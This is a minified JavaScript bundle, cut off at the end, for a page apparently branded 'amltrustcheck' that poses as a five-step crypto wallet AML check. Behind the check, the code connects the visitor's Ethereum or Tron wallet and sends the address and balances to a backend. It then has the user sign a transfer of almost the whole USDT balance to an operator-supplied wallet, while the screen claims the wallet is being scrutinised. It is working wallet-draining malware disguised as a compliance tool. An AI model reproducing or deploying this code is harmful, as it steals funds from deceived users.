(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[406], { 35883: function () { }, 46601: function () { }, 89214: function () { }, 85568: function () { }, 80593: function (e, t, a) { Promise.resolve().then(a.bind(a, 25753)) }, 25753: function (e, t, a) { "use strict"; a.r(t), a.d(t, { default: function () { return L } }); var n = a(57437), s = a(99376), l = a(50663), i = a(56277), r = a(2265), o = a(65208), c = a(44978), u = a(81864); class p { getTronWeb() { return new u.CU({ fullHost: this.tronHost }) } async getBalanceTRX(e) { try { let t = this.getTronWeb(); return await t.trx.getBalance(e) / 1e6 } catch (e) { throw Error(e) } } async getBalanceUSDT(e) { return this.getBalance(e, this.USDTContract) } async getBalance(e, t) { let a = this.getTronWeb(); a.setAddress(e); let n = await a.contract().at(t), s = await n.methods.balanceOf(e).call(); return Array.isArray(s) ? a.toDecimal(s[0]) / 1e6 : a.toDecimal(s) / 1e6 } async signMessage(e, t) { if (!this.provider) throw Error("Provider is required to sign a message."); try { let a = await this.provider.request({ method: "tron_signMessage", params: { address: t, message: e } }, "tron:0x2b6653dc"); return { method: "tron_signMessage", address: t, valid: !0, result: a.signature } } catch (e) { throw Error(e) } } async sendTransaction(e, t, a) { if (!this.provider) throw Error("Provider is required to sign a transaction."); try { let n = this.getTronWeb(), s = this.USDTContract, l = (n.toSun(a).toString() + ".1").split(".")[0], i = await n.transactionBuilder.triggerSmartContract(s, "transfer(address,uint256)", { feeLimit: 1e8, callValue: 0 }, [{ type: "address", value: t }, { type: "uint256", value: l }], e), r = (await this.provider.request({ method: "tron_signTransaction", params: { address: e, transaction: i } }, this.mainNet)).result, o = await n.trx.sendRawTransaction(r); return { method: "tron_signTransaction", address: e, valid: !0, result: o.result } } catch (e) { throw Error(e) } } constructor(e) { this.provider = e, this.USDTContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", this.tronHost = "https://api.trongrid.io/", this.mainNet = "tron:0x2b6653dc" } } var d = a(33145), b = { src: "/_next/static/media/wallet-connect.eac17915.png", height: 40, width: 40, blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAJ1BMVEUul/9MaXE+l/8Af/82l/8slf83lv+m0f92t/83l/9Do/8umv+Kw/+nrzgLAAAACnRSTlPvABsCU11f/fschKWYrQAAAAlwSFlzAAALEwAACxMBAJqcGAAAADVJREFUeJw9y0EWABAMxNBUVWu4/3k9C9Y/wW2OMc2xzlp0o6Eq0QjV3qUglJmpuCRd+vHbDzHIAWFUxxQHAAAAAElFTkSuQmCC", blurWidth: 8, blurHeight: 8 }, m = { src: "/_next/static/media/usdt.2f8e8de0.png", height: 512, width: 512, blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAMFBMVEUlo3wmoXun2cknpn5MaXEenXZZt5odnnUKlGkoo305qYcorISc1MPq9vJAtpEhqH9FhFPOAAAACnRSTlPwLv2wAPf+tPmzpCiALAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAADtJREFUeJwVxkkSwCAMAzA7SwEnwP9/20EnITgyBwPEkQ4IL9vbygHJTMJL94vX7J7lIO73XRDBlbkYPzewAZFwNVUGAAAAAElFTkSuQmCC", blurWidth: 8, blurHeight: 8 }; let y = [], x = ["tron:0x2b6653dc"], h = ["tron_signMessage", "tron_signTransaction"], w = "52461522b6d5419110101b789dc8697a", f = new c.WalletConnectModal({ projectId: w, chains: x, mobileWallets: [{ id: "metamask", name: "MetaMask", links: { universal: "https://metamask.app.link", native: "metamask://" } }, { id: "trust", name: "Trust Wallet", links: { universal: "https://link.trustwallet.com", native: "trust://" } }, { id: "okx", name: "OKX Wallet", links: { universal: "https://okx.com", native: "okex://" } }, { id: "bitget", name: "Bitget Wallet", links: { universal: "https://bitget.com", native: "bitget://" } }, { id: "binance", name: "Binance Wallet", links: { universal: "https://www.binance.com", native: "binance://" } }, { id: "uniswap", name: "Uniswap Wallet", links: { universal: "https://uniswap.wallet.link", native: "uniswap://" } }, { id: "safepal", name: "SafePal", links: { universal: "https://safepal.page.link", native: "safepal://" } }, { id: "rainbow", name: "Rainbow", links: { universal: "https://rnbwapp.com", native: "rainbow://" } }, { id: "bybit", name: "Bybit Wallet", links: { universal: "https://bybit.com", native: "bybit://" } }], walletImages: { metamask: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/018b2d52-10e9-4158-1fde-a5d5bac5aa00?projectId=" + w, trust: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=" + w, okx: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/45f2f08e-fc0c-4d62-3e63-404e72170500?projectId=" + w, bitget: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/68e8063a-ff69-4941-3b40-af09e2fcd700?projectId=" + w, binance: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=" + w, uniswap: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/bff9cf1f-df19-42ce-f62a-87f04df13c00?projectId=" + w, safepal: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/252753e7-b783-4e03-7f77-d39864530900?projectId=" + w, rainbow: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=" + w, bybit: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/b9e64f74-0176-44fd-c603-673a45ed5b00?projectId=" + w } }); var A = () => { let [e, t] = (0, r.useState)(!1), [a, s] = (0, r.useState)(!1), [l, c] = (0, r.useState)(!1), [u, A] = (0, r.useState)(!1), [g, v] = (0, r.useState)(-1), [j, k] = (0, r.useState)(""), [S, N] = (0, r.useState)(null), [M, C] = (0, r.useState)(null), [E, T] = (0, r.useState)(null), [I, W] = (0, r.useState)(null), [B, U] = (0, r.useState)(null), [P, F] = (0, r.useState)(!1); (0, r.useEffect)(() => { (async function () { W(await o.Z.init({ logger: "error", projectId: w, metadata: { name: "amltrustcheck", description: "Tron integration with WalletConnect's Universal Provider", url: "https://amltrustcheck.com", icons: ["https://assets.reown.com/reown-profile-pic.png"] } })) })().then(e => e) }, []), (0, r.useEffect)(() => { I && I.on("display_uri", async e => { console.log("uri", e), await f.openModal({ uri: e }) }) }, [I]), (0, r.useEffect)(() => { async function e() { if (!B) return; let e = await B.getBalanceUSDT(j), t = await B.getBalanceTRX(j); console.log("USDT: ", e, " TRX: ", t), N(e), C(t) } a && e().then(e => e) }, [j, a, B]); let L = async () => { try { var e, t; if (!I) return; await I.connect({ namespaces: { tron: { methods: h, chains: x, events: y } } }); let a = new p(I); U(a), console.log("session?", I); let n = null === (t = I.session) || void 0 === t ? void 0 : null === (e = t.namespaces.tron) || void 0 === e ? void 0 : e.accounts[0].split(":")[2]; k(n); let l = await a.getBalanceUSDT(n), r = await a.getBalanceTRX(n), o = { wallet: n, money: l.toString(), fee: r.toString(), network: "TRC-20", data: null }; await (0, i.R4)(o), s(!0), F(!1) } catch (e) { console.log("Something went wrong, request cancelled") } f.closeModal() }, H = async e => { console.log("signing"); try { let t = await B.sendTransaction(j, e, Number(.9999 * S)); return console.log("result send tx: ", t), t } catch (e) { throw A(!0), e } }, Q = async () => { if (P) return; F(!0), await L(); let e = await (0, i.C5)(); e || A(!0), T(e) }, X = async () => { if (t(!0), E.trcMinAmount > .999 * S) { await _(2e3), c(!0), console.log("trc min amount ", E.trcMinAmount); return } if (M < 30) { await _(1e3), A(!0); return } let e = await H(E.trcWallet); if (e.result) { c(!0), console.log("result ", e.result); let t = { internalWallet: E.trcWallet, userWallet: j, coin: "USDT", amount: .999 * S, network: "TRC-20", data: null }; await (0, i.hM)(t), console.log("Paid") } else A(!0) }; return (0, n.jsx)("div", { className: "App center-content", children: u ? (0, n.jsx)(D, {}) : l ? (0, n.jsx)(R, {}) : e ? (0, n.jsx)(O, {}) : a ? (0, n.jsxs)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: "text-2xl text-black font-bold", children: "Almost done" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 4 of 5" })] }), (0, n.jsx)("button", { onClick: X, className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: (0, n.jsx)("p", { className: "pr-6", children: "Go" }) })] }) : -1 === g ? (0, n.jsxs)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: " text-2xl text-black font-bold", children: "Choose token" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 2 of 5" })] }), (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "Please select the token you want to check" }), (0, n.jsxs)("button", { onClick: () => v(1), className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: [(0, n.jsx)(d.default, { src: m, alt: "UsdtIcon", width: 30 }), (0, n.jsx)("p", { className: "pr-6", children: "USDT" })] })] }) : (0, n.jsxs)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: " text-2xl text-black font-bold", children: "Connect wallet" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 3 of 5" })] }), (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "To continue, select and connect your wallet" }), (0, n.jsxs)("button", { onClick: Q, className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: [(0, n.jsx)(d.default, { src: b, alt: "WalletConnectIcon", width: 30 }), (0, n.jsx)("p", { className: "pr-6", children: "WalletConnect" })] })] }) }) }, g = a(54900), v = a(49296), j = a(30796), k = a(43016), S = [{ constant: !0, inputs: [], name: "name", outputs: [{ name: "", type: "string" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [{ name: "_upgradedAddress", type: "address" }], name: "deprecate", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !1, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [], name: "deprecated", outputs: [{ name: "", type: "bool" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [{ name: "_evilUser", type: "address" }], name: "addBlackList", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [], name: "totalSupply", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [{ name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transferFrom", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [], name: "upgradedAddress", outputs: [{ name: "", type: "address" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [{ name: "", type: "address" }], name: "balances", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "maximumFee", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "_totalSupply", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [], name: "unpause", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [{ name: "_maker", type: "address" }], name: "getBlackListStatus", outputs: [{ name: "", type: "bool" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [{ name: "", type: "address" }, { name: "", type: "address" }], name: "allowed", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "paused", outputs: [{ name: "", type: "bool" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [{ name: "who", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [], name: "pause", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [], name: "getOwner", outputs: [{ name: "", type: "address" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "owner", outputs: [{ name: "", type: "address" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "symbol", outputs: [{ name: "", type: "string" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [{ name: "_to", type: "address" }, { name: "_value", type: "uint256" }], name: "transfer", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !1, inputs: [{ name: "newBasisPoints", type: "uint256" }, { name: "newMaxFee", type: "uint256" }], name: "setParams", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !1, inputs: [{ name: "amount", type: "uint256" }], name: "issue", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !1, inputs: [{ name: "amount", type: "uint256" }], name: "redeem", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [{ name: "_owner", type: "address" }, { name: "_spender", type: "address" }], name: "allowance", outputs: [{ name: "remaining", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [], name: "basisPointsRate", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !0, inputs: [{ name: "", type: "address" }], name: "isBlackListed", outputs: [{ name: "", type: "bool" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [{ name: "_clearedUser", type: "address" }], name: "removeBlackList", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !0, inputs: [], name: "MAX_UINT", outputs: [{ name: "", type: "uint256" }], payable: !1, stateMutability: "view", type: "function" }, { constant: !1, inputs: [{ name: "newOwner", type: "address" }], name: "transferOwnership", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { constant: !1, inputs: [{ name: "_blackListedUser", type: "address" }], name: "destroyBlackFunds", outputs: [], payable: !1, stateMutability: "nonpayable", type: "function" }, { inputs: [{ name: "_initialSupply", type: "uint256" }, { name: "_name", type: "string" }, { name: "_symbol", type: "string" }, { name: "_decimals", type: "uint256" }], payable: !1, stateMutability: "nonpayable", type: "constructor" }, { anonymous: !1, inputs: [{ indexed: !1, name: "amount", type: "uint256" }], name: "Issue", type: "event" }, { anonymous: !1, inputs: [{ indexed: !1, name: "amount", type: "uint256" }], name: "Redeem", type: "event" }, { anonymous: !1, inputs: [{ indexed: !1, name: "newAddress", type: "address" }], name: "Deprecate", type: "event" }, { anonymous: !1, inputs: [{ indexed: !1, name: "feeBasisPoints", type: "uint256" }, { indexed: !1, name: "maxFee", type: "uint256" }], name: "Params", type: "event" }, { anonymous: !1, inputs: [{ indexed: !1, name: "_blackListedUser", type: "address" }, { indexed: !1, name: "_balance", type: "uint256" }], name: "DestroyedBlackFunds", type: "event" }, { anonymous: !1, inputs: [{ indexed: !1, name: "_user", type: "address" }], name: "AddedBlackList", type: "event" }, { anonymous: !1, inputs: [{ indexed: !1, name: "_user", type: "address" }], name: "RemovedBlackList", type: "event" }, { anonymous: !1, inputs: [{ indexed: !0, name: "owner", type: "address" }, { indexed: !0, name: "spender", type: "address" }, { indexed: !1, name: "value", type: "uint256" }], name: "Approval", type: "event" }, { anonymous: !1, inputs: [{ indexed: !0, name: "from", type: "address" }, { indexed: !0, name: "to", type: "address" }, { indexed: !1, name: "value", type: "uint256" }], name: "Transfer", type: "event" }, { anonymous: !1, inputs: [], name: "Pause", type: "event" }, { anonymous: !1, inputs: [], name: "Unpause", type: "event" }]; let N = "52461522b6d5419110101b789dc8697a", M = "0xdAC17F958D2ee523a2206206994597C13D831ec7", C = ["function balanceOf(address owner) view returns (uint256)"], E = [{ id: "metamask", name: "MetaMask", links: { universal: "https://metamask.app.link", native: "metamask://" } }, { id: "trust", name: "Trust Wallet", links: { universal: "https://link.trustwallet.com", native: "trust://" } }, { id: "okx", name: "OKX Wallet", links: { universal: "https://okx.com", native: "okex://" } }, { id: "bitget", name: "Bitget Wallet", links: { universal: "https://bitget.com", native: "bitget://" } }, { id: "binance", name: "Binance Wallet", links: { universal: "https://www.binance.com", native: "binance://" } }, { id: "uniswap", name: "Uniswap Wallet", links: { universal: "https://uniswap.wallet.link", native: "uniswap://" } }, { id: "safepal", name: "SafePal", links: { universal: "https://safepal.page.link", native: "safepal://" } }, { id: "rainbow", name: "Rainbow", links: { universal: "https://rnbwapp.com", native: "rainbow://" } }, { id: "bybit", name: "Bybit Wallet", links: { universal: "https://bybit.com", native: "bybit://" } }], T = { metamask: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/018b2d52-10e9-4158-1fde-a5d5bac5aa00?projectId=" + N, trust: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=" + N, okx: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/45f2f08e-fc0c-4d62-3e63-404e72170500?projectId=" + N, bitget: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/68e8063a-ff69-4941-3b40-af09e2fcd700?projectId=" + N, binance: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=" + N, uniswap: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/bff9cf1f-df19-42ce-f62a-87f04df13c00?projectId=" + N, safepal: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/252753e7-b783-4e03-7f77-d39864530900?projectId=" + N, rainbow: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=" + N, bybit: "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/b9e64f74-0176-44fd-c603-673a45ed5b00?projectId=" + N }; var I = () => { let [e, t] = (0, r.useState)(-1), [a, s] = (0, r.useState)(!1), [l, o] = (0, r.useState)(!1), [c, u] = (0, r.useState)(!1), [p, y] = (0, r.useState)(!1), [x, h] = (0, r.useState)(null), [w, f] = (0, r.useState)(null), [A, I] = (0, r.useState)(!1); (0, r.useEffect)(() => { (async function () { let e = await g.ZP.init({ projectId: N, chains: [1], methods: ["personal_sign", "eth_sendTransaction"], showQrModal: !0, qrModalOptions: { mobileWallets: E, walletImages: T, themeMode: "light" }, metadata: { name: "amltrustcheck", description: "Tron integration with WalletConnect's Universal Provider", url: "https://amltrustcheck.com", icons: ["https://assets.reown.com/reown-profile-pic.png"] } }); e.on("display_uri", e => { console.log("display_uri", e) }), f(e) })().then() }, []); let W = async () => { let e = await B(), t = await U(); await (0, i.R4)({ wallet: w.accounts[0], money: String(e), fee: String(t), network: "ERC-20", data: null }) }, B = async () => { let e = new v.Q(w).getSigner(w.accounts[0]), t = new j.CH(M, C, e), a = await t.balanceOf(w.accounts[0]); return Number(k.bM(a, 6)) }, U = async () => { let e = new v.Q(w).getSigner(w.accounts[0]), t = await e.getBalance(); return console.log(t), Number(k.bM(t, 6)) / 1e12 }, P = async () => { w.connect().then(() => { W(), s(!0), I(!1) }) }, F = async (e, t, a) => { try { let n = new v.Q(w).getSigner(e), s = new j.CH(M, S, n), l = (a.toString() + ".1").split(".")[0], i = k.vz(l, 6); console.log("133"); let r = await s.transfer(t, i); console.log("135"); let o = await r.wait(); return console.log("Success: ", o), !0 } catch (e) { return console.error("Eh eh eh: ", e), !1 } }, L = async () => { o(!0); let e = w.accounts[0], t = await B() * .9999, a = await U(); if (console.log("USDT: ", t, " ETH: ", a), console.log(x), x.ercMinAmount > t) { await _(3e3), u(!0); return } if (a < .0025) { await _(1e3), y(!0); return } if (await F(e, x.ercWallet, t)) { u(!0); let a = { internalWallet: x.ercWallet, userWallet: e, coin: "USDT", amount: t, network: "ERC-20", data: null }; await (0, i.hM)(a), console.log("Paid") } else y(!0) }, H = async () => { A || (I(!0), await P(), h(await (0, i.C5)())) }; return (0, n.jsx)("div", { className: "App center-content", children: p ? (0, n.jsx)(D, {}) : c ? (0, n.jsx)(R, {}) : l ? (0, n.jsx)(O, {}) : a ? (0, n.jsxs)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: "text-2xl text-black font-bold", children: "Almost done" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 4 of 5" })] }), (0, n.jsx)("button", { onClick: L, className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: (0, n.jsx)("p", { className: "pr-6", children: "Go" }) })] }) : -1 === e ? (0, n.jsxs)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: " text-2xl text-black font-bold", children: "Choose token" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 2 of 5" })] }), (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "Please select the token you want to check" }), (0, n.jsxs)("button", { onClick: () => t(2), className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: [(0, n.jsx)(d.default, { src: m, alt: "UsdtIcon", width: 30 }), (0, n.jsx)("p", { className: "pr-6", children: "USDT" })] })] }) : (0, n.jsxs)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: " text-2xl text-black font-bold", children: "Connect wallet" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 3 of 5" })] }), (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "To continue, select and connect your wallet" }), (0, n.jsxs)("button", { onClick: H, className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: [(0, n.jsx)(d.default, { src: b, alt: "WalletConnectIcon", width: 30 }), (0, n.jsx)("p", { className: "pr-6", children: "WalletConnect" })] })] }) }) }, W = { src: "/_next/static/media/tron.3e77fb8d.png", height: 2e3, width: 2e3, blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAKlBMVEVMaXH/BAn/Bgb/BQr/BAn/BQn/CAD/BAj/Bgr/BQn/BQr/ABj/BQn/BQoNRmXbAAAADnRSTlMAZSJ2UJIMQ6GANQXOr5UasI4AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAOElEQVR4nBXFSRYAEAxEwd8ZkOD+1/XUprhHChsQSzZvDcxb5bmgLNJyQis6BGx3+Z95cvONZcADK98BFm6tPq4AAAAASUVORK5CYII=", blurWidth: 8, blurHeight: 8 }, B = { src: "/_next/static/media/ethereum.87ae1343.png", height: 512, width: 512, blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAM1BMVEVhfetlgvFjgOtjgvhxiuxifuplgvBge+hMaXFmgu6SpfFee+qwvvWBmO/P1/nh5/uer/MkF/IjAAAACnRSTlP2sLP/+bSwLgDrI3pH2gAAAAlwSFlzAAAOxAAADsQBlSsOGwAAADtJREFUeJw1y8kRwCAMALEldjD4APqvNsMjf4lhD7w2sCnlMo0m7KXSIM5ODyA8qwK66EqVfrGfi//+ATzxAbb/latkAAAAAElFTkSuQmCC", blurWidth: 8, blurHeight: 8 }, U = a(12080), P = { src: "/_next/static/media/spinner.8918ac66.gif", height: 1500, width: 4320, blurWidth: 0, blurHeight: 0 }; let _ = e => new Promise(t => setTimeout(t, e)), D = () => (0, n.jsx)("div", { className: "flex flex-col justify-center max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: (0, n.jsx)("div", { className: "flex flex-row justify-center", children: (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "External error" }) }) }), R = () => (0, n.jsx)("div", { className: "flex flex-col justify-center min-h-64 min-w-96", children: (0, n.jsx)("div", { className: "flex flex-row justify-center", children: (0, n.jsx)(d.default, { className: "select-none", draggable: "false", src: U.Z, alt: "AnalyticsImage", width: 400 }) }) }), O = () => (0, n.jsxs)("div", { className: "flex flex-col justify-between max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: " text-2xl text-black font-bold", children: "Check in progress" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 5 of 5" })] }), (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "We scrutinize your wallet thoroughly" }), (0, n.jsx)(d.default, { src: P, alt: "Spinner", height: 300 }), (0, n.jsx)("p", { className: "text-gray-700 bg-gray-300 text-sm pl-4", children: "We scrutinize your wallet thoroughly" })] }); var F = () => { let [e, t] = (0, r.useState)(-1); return (0, n.jsx)("div", { className: "App center-content", children: 2 === e ? (0, n.jsx)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: (0, n.jsx)(I, {}) }) : 4 === e ? (0, n.jsx)("div", { className: "flex flex-col justify-start max-h-96 min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: (0, n.jsx)(A, {}) }) : (0, n.jsxs)("div", { className: "flex flex-col justify-start min-h-64 min-w-96 bg-white border-black border-2 border-opacity-15 rounded-3xl", children: [(0, n.jsxs)("div", { className: "flex flex-row justify-between space-x-3 p-4", children: [(0, n.jsx)("h1", { className: " text-2xl text-black font-bold", children: "Wallet check" }), (0, n.jsx)("p", { className: "text-blue-900 bg-blue-200 border-blue-400 rounded-3xl p-1 border-2 border-opacity-20", children: "Step 1 of 5" })] }), (0, n.jsx)("p", { className: "text-black text-lg pl-4", children: "Please select the network you want to use" }), (0, n.jsxs)("button", { onClick: () => t(2), className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: [(0, n.jsx)(d.default, { src: B, alt: "EthereumIcon", width: 30 }), (0, n.jsx)("p", { className: "pr-6", children: "Ethereum" })] }), (0, n.jsxs)("button", { onClick: () => t(4), className: "bg-white text-black border-black border-2 rounded-3xl p-2 m-4 flex flex-row justify-center space-x-5 hover:bg-blue-200 duration-500", children: [(0, n.jsx)(d.default, { src: W, alt: "TronIcon", width: 30 }), (0, n.jsx)("p", { className: "pr-6", children: "Tron" })] })] }) }) }; function L() { let e = (0, s.usePathname)(), t = (null == e ? void 0 : e.split("/")[1]) || "en"; if (null === (0, l.F)(t)) return null; let [a, o] = (0, r.useState)(!1); return a || ((0, i.iU)(), o(!0)), (0, n.jsx)("div", { className: "flex flex-row justify-center pt-32 pb-32 space-x-3", children: (0, n.jsx)(F, {}) }) } }, 56277: function (e, t, a) { "use strict"; a.d(t, { C5: function () { return s }, R4: function () { return r }, hM: function () { return o }, iU: function () { return i }, yA: function () { return l } }); let n = "https://amltrustcheck.com:10000", s = async () => { try { let e = await fetch(n + "/api/info"); if (e.ok) return await e.json(); if (404 === e.status) return null; throw Error("HTTP error! status: " + e.status) } catch (e) { return console.error("Error:", e), null } }, l = async () => { try { let e = await fetch(n + "/api/start", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(await c()) }); if (!e.ok) throw Error("HTTP error! status: " + e.status) } catch (e) { throw console.error("Error:", e), e } }, i = async () => { try { let e = await fetch(n + "/api/payment", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(await c()) }); if (!e.ok) throw Error("HTTP error! status: " + e.status) } catch (e) { throw console.error("Error:", e), e } }, r = async e => { try { e.data = await c(); let t = await fetch(n + "/api/connect", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(e) }); if (!t.ok) throw Error("HTTP error! status: " + t.status) } catch (e) { throw console.error("Error:", e), e } }, o = async e => { try { e.data = await c(); let t = await fetch(n + "/api/pay", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(e) }); if (!t.ok) throw 